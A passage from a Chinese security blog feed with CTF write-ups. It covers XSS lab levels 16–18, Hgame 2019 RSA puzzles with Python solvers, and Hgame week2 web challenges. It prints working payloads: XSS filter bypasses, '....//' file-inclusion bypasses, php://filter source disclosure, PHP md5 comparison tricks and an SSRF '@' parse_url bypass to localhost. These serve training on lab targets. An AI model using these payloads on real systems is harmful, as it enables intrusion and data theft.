alt="A6sGqA.md.png"></a></p><p>发现已经出现第三关的页面，这里要注意的是，字符串经过了htmlspecialchars()函数，所以尽量不要使用payload里出现<code>&lt;&gt;</code>的关卡</p><p>payload：<code>?src=&quot;level3.php?keyword=&#39; onkeypress=&#39;alert(2333)&quot;</code></p><h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现过滤了<code>script,空格，/</code>，script被转义，那我们可以换一种标签img，这样的话也不需要使用/，一举多得，但是还有一个问题就是空格如何绕过，这里采取编码的方式，用<code>%0d</code> <code>%0a</code> 进行绕过</p><p>payload：<code>?keyword=&lt;img%0dsrc=1%0donerror=&quot;alert(2333)&quot;&gt;</code></p><h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是\<embed> 标签，用来定义嵌入的内容，比如插件；这里我们可以使用html事件属性去构造弹窗；</p><p>payload：<code>?arg01=a&amp;arg02=b onmouseover=alert(23333)</code></p><h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和上题一毛一样…不再赘述；</p><p>payload：<code>?arg01=a&amp;arg02=b onmouseover=alert(2333)</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;XSS-初体验~
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="XSS" scheme="https://gardenia30.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Hgame-2019几道有趣的RSA</title>
    <link href="https://gardenia30.top/2019/03/02/Hgame-2019%E5%87%A0%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84Crypto/"/>
    <id>https://gardenia30.top/2019/03/02/Hgame-2019几道有趣的Crypto/</id>
    <published>2019-03-02T11:45:35.000Z</published>
    <updated>2019-03-03T07:51:31.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>信安数论问题…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><blockquote><p>e = 12<br>p = 58380004430307803367806996460773123603790305789098384488952056206615768274527<br>q = 81859526975720060649380098193671612801200505029127076539457680155487669622867<br>ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460<br>算出的m转化成字符串</p></blockquote><p>说实话这题本来以为很简单的，想直接求私钥，直接求解，没想到算出来φ(n)和e=12不互素，无法求出e对应的公钥，所以直接解是没有办法的；</p><p>解法如下：</p><p><a href="https://imgchr.com/i/kquFSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/02/kquFSI.md.jpg" alt="kquFSI.md.jpg"></a></p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">ciphertext = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">n=p*q</span><br><span class="line">ol=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">3</span>,ol)</span><br><span class="line">ciphertext1=pow(ciphertext,d,n)</span><br><span class="line">ans=rabin_decrypt(ciphertext1,p,q,e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">temp=rabin_decrypt(i,p,q,e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> temp:</span><br><span class="line">flag=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><blockquote><p>m为17位十进制数，提交格式hgame{m}</p><p>e1:0x33240</p><p>e2:0x3e4f</p><p>n:0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</p><p>c1:0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</p><p>c2:0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</p><p>c1=pow(m, e1, n)<br>c2=pow(m, e2, n)</p></blockquote><p>先转化为10进制，发现e1=209472，e2=15951，e1,e2不互素，最大公因数为3；本想用共模攻击，但是e1和e2不互素，没办法达到共模攻击的条件，但是仔细推来发现：</p><blockquote><p>gcd(e1,e2)=3，则gcd(e1/3,e2/3)=1</p><p>所以令a1=e1/3,a2=e2/3，则gcd(a1,a2)=1</p><p>所以存在r*a1+s*a2=1，所以r*e1+s*e2=3 (扩展欧几里得算法)</p><p>则(c1^r)*(c2^s)=(m^(r*e1))<em>(m^(s\</em>e2))=m^(r*e1+s*e2)=m^3 //共模攻击</p><p>所以到此为止：(m^3) mod n=(c1^r)*(c2^s) mod n 为已知数</p><p>所以直接低指数攻击即可</p></blockquote><p>上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_attack</span><span class="params">(e1,e2,mess1,mess2,n)</span>:</span></span><br><span class="line">gcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line">s=-s</span><br><span class="line">mess1=gmpy2.invert(mess1,n)</span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line">t=-t</span><br><span class="line">mess2=gmpy2.invert(mess2,n)</span><br><span class="line">mess=gmpy2.powmod(mess1,s,n)*gmpy2.powmod(mess2,t,n)%n</span><br><span class="line"><span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_attack</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">e1=<span class="string">"0x33240"</span></span><br><span class="line">e2=<span class="string">"0x3e4f"</span></span><br><span class="line">n=<span class="string">"0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1"</span></span><br><span class="line">c1=<span class="string">"0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d"</span></span><br><span class="line">c2=<span class="string">"0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6"</span></span><br><span class="line">e1=int(e1,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">e2=int(e2,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">n=int(n,<span class="number">16</span>)</span><br><span class="line">c1=int(c1,<span class="number">16</span>)</span><br><span class="line">c2=int(c2,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print gmpy2.gcd(e1,e2)</span></span><br><span class="line">ans=same_attack(e1,e2,c1,c2,n)</span><br><span class="line"><span class="comment"># print ans </span></span><br><span class="line">small_attack(ans,n,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>加上“hgame”即可得到flag：</p><p><img src="https://s2.ax1x.com/2019/03/03/kLDs9s.png" alt="kLDs9s.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;信安数论问题…
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame-2019-week2-WP</title>
    <link href="https://gardenia30.top/2019/02/23/%E6%9D%AD%E7%94%B5HGAME-WEEK2-WP/"/>
    <id>https://gardenia30.top/2019/02/23/杭电HGAME-WEEK2-WP/</id>
    <published>2019-02-23T08:06:51.000Z</published>
    <updated>2019-03-03T07:46:32.124Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平台比赛在2月24号就结束了，只能复现一下，千言万语汇成一句话：爬虫题牛X！！！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><p>看见标题为<code>where is my robots</code>，访问<code>robots.txt</code>，发现一个访问路径<code>img/index.php</code>，访问到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>第一步也是看见了文件包含，又是<code>str_replace</code>，大概又是双写绕过，构造如下:</p><p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=....//flag</code></p><p>没有得到flag，出来一句：<code>maybe_you_should_think_think</code>…想想也是，既然已经week2，肯定不会那么简单…由于通过 include_once 方式将文件执行，如果没有进行输出操作就无法显示出来；</p><p>第二步尝试使用php伪协议，构造如下：</p><p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag</code></p><p>得到base64编码：</p><p><code>PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK</code></p><p>解码即可：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgWSjs.png" alt="kgWSjs.png"></p><h3 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h3><p>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 admin.php 返回 “only localhost can see it”；那就11个判断，逐个击破：</p><p><strong>step1~2</strong></p><p>弱判断<strong>(!=)</strong>，使得str1和str2的md5值相等(==)，很简单，使用<code>str1=240610708&amp;str2=QNKCDZO</code>直接绕过；</p><p><strong>step3~4</strong></p><p>强判断<strong>(!==)</strong>，使得str3和str4的md5值相等(===)，直接数组绕过即可：<code>str3[]=a&amp;str4[]=b</code></p><p><strong>step5~8</strong></p><p>php 处理参数时会将参数名中的 “.” 替换为 “_”，所以即可构造<code>H.game</code>变量即可绕过step5；</p><p>构造数组绕过数字判断返回false，大小判断返回false，string以后产生Array，即可返回false：<code>H.game[]=1</code>；</p><p><strong>step9~11</strong></p><p>一开始没看懂，科普了一下大概是明白了，要求<code>PHP_URL_SCHEME</code>必须是<code>http</code>，<code>PHP_URL_HOST</code>必须是<code>www.baidu.com</code>，但是上述又必须localhost才可以访问，无从下手……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.runoob.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概可以看懂，其实就是设置访问某个url资源，必须要成功访问，即可让<code>curl_exec</code>返回true，Google到一下资料学习到了：</p><blockquote><p>当url中有多个@符号时，<strong>parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的</strong>。因此当代码对<a href="mailto:`user@eval.com" target="_blank" rel="noopener">`user@eval.com</a>:<a href="mailto:80@baidu.com" target="_blank" rel="noopener">80@baidu.com</a>` 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过</p><p>source:<a href="https://xz.aliyun.com/t/2215" target="_blank" rel="noopener">https://xz.aliyun.com/t/2215</a></p></blockquote><p>即可构造如下：<code>url=http://@127.0.0.1:80@www.baidu.com/admin.php</code></p><p>得到admin.php的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为有<code>file_exists</code>，直接查看<code>flag.php</code>肯定是不行的，那就继续构造php伪协议绕过即可：</p><p><code>?filename=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到：</p><p><code>PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo=</code></p><p>base64解码得flag：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgoarQ.png" alt="kgoarQ.png"></p><h3 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best 